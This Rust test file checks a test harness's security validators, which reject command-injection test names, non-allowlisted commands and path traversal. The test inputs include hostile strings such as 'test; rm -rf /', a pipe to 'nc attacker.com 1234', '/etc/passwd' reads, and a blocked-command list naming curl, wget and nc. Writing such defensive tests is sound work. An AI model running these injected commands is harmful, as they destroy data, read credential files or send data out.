use arkavo_test::security::{validate_command, validate_test_name, validate_timeout};
use arkavo_test::{TestError, TestHarness};
use serde_json::json;
use std::time::Duration;

#[test]
fn test_command_injection_prevention() {
    // Test various injection attempts
    let dangerous_names = vec![
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "test`whoami`",
        "test$(date)",
        "test\ncat /etc/passwd",
        "../../../etc/passwd",
        "/absolute/path/to/test",
        "test\\x00name",
    ];

    for name in dangerous_names {
        let result = validate_test_name(name);
        assert!(
            result.is_err(),
            "Should reject dangerous test name: {}",
            name
        );
        if let Err(TestError::Validation(msg)) = result {
            assert!(
                msg.contains("Invalid") || msg.contains("cannot"),
                "Error message should be descriptive for: {}",
                name
            );
        }
    }
}

#[test]
fn test_valid_test_names() {
    // Test valid names from different languages
    let valid_names = vec![
        "test_simple",
        "test::module::function",
        "TestClass.testMethod",
        "test-suite/test-case",
        "test_with_numbers_123",
        "deeply::nested::test::path",
        "TestSuite/TestCase/testMethod",
    ];

    for name in valid_names {
        let result = validate_test_name(name);
        assert!(result.is_ok(), "Should accept valid test name: {}", name);
    }
}

#[test]
fn test_command_whitelist() {
    // Test allowed commands
    let allowed = vec!["cargo", "npm", "pytest", "go", "swift"];
    for cmd in allowed {
        assert!(
            validate_command(cmd).is_ok(),
            "Should allow command: {}",
            cmd
        );
    }

    // Test disallowed commands
    let disallowed = vec!["rm", "curl", "wget", "nc", "bash", "sh", "eval"];
    for cmd in disallowed {
        assert!(
            validate_command(cmd).is_err(),
            "Should block command: {}",
            cmd
        );
    }
}

#[test]
fn test_timeout_validation() {
    // Default timeout
    assert_eq!(validate_timeout(None), Duration::from_secs(300));

    // Zero timeout should use default
    assert_eq!(validate_timeout(Some(0)), Duration::from_secs(300));

    // Normal timeout
    assert_eq!(validate_timeout(Some(60)), Duration::from_secs(60));

    // Excessive timeout should be capped
    assert_eq!(validate_timeout(Some(7200)), Duration::from_secs(3600));
}

#[tokio::test]
async fn test_mcp_server_rejects_invalid_test_names() {
    let harness = TestHarness::new().unwrap();
    let server = harness.mcp_server();

    let dangerous_request = arkavo_test::mcp::server::ToolRequest {
        tool_name: "run_test".to_string(),
        params: json!({
            "test_name": "test; rm -rf /",
            "timeout": 5
        }),
    };

    let result = server.call_tool(dangerous_request).await;
    assert!(result.is_err());
    if let Err(err) = result {
        let err_str = err.to_string();
        assert!(
            err_str.contains("Invalid") || err_str.contains("Validation"),
            "Error should indicate validation failure: {}",
            err_str
        );
    }
}

#[tokio::test]
async fn test_mcp_error_responses() {
    let harness = TestHarness::new().unwrap();
    let server = harness.mcp_server();

    // Test invalid tool name
    let invalid_tool = arkavo_test::mcp::server::ToolRequest {
        tool_name: "nonexistent_tool".to_string(),
        params: json!({}),
    };

    let result = server.call_tool(invalid_tool).await;
    assert!(result.is_err());

    // Test missing required parameters
    let missing_params = arkavo_test::mcp::server::ToolRequest {
        tool_name: "query_state".to_string(),
        params: json!({}), // Missing required 'entity' parameter
    };

    let result = server.call_tool(missing_params).await;
    assert!(result.is_err());
}

#[test]
fn test_test_name_length_limits() {
    // Empty name
    assert!(validate_test_name("").is_err());

    // Very long name
    let long_name = "a".repeat(257);
    assert!(validate_test_name(&long_name).is_err());

    // Max length name (256 chars)
    let max_name = "a".repeat(256);
    assert!(validate_test_name(&max_name).is_ok());
}

#[cfg(test)]
mod path_traversal_tests {
    use arkavo_test::security::validate_path;
    use std::path::Path;
    use tempfile::TempDir;

    #[test]
    fn test_path_traversal_prevention() {
        let temp_dir = TempDir::new().unwrap();
        let base_path = temp_dir.path();

        // Test various traversal attempts
        let dangerous_paths = vec![
            "../../../etc/passwd",
            "./../..",
            "/etc/passwd",
            "subdir/../../..",
        ];

        for path_str in dangerous_paths {
            let path = Path::new(path_str);
            let result = validate_path(path, base_path);
            assert!(
                result.is_err(),
                "Should reject path traversal: {}",
                path_str
            );
        }
    }

    #[test]
    fn test_valid_paths() {
        let temp_dir = TempDir::new().unwrap();
        let base_path = temp_dir.path();

        // Create some subdirectories
        std::fs::create_dir_all(base_path.join("subdir/nested")).unwrap();

        // Test valid paths
        let valid_paths = vec!["file.txt", "subdir/file.txt", "subdir/nested/file.txt"];

        for path_str in valid_paths {
            // Create the file so canonicalize works
            let full_path = base_path.join(path_str);
            if let Some(parent) = full_path.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(&full_path, "test").unwrap();

            let path = Path::new(path_str);
            let result = validate_path(path, base_path);
            assert!(result.is_ok(), "Should accept valid path: {}", path_str);
        }
    }
}